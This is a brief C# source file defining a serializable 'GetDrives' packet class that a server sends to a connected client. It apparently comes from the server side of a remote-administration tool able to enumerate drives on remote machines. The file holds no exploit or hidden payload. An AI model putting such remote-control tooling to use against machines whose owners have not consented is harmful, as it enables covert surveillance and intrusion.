using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetDrives : IPacket
    {
        public GetDrives()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}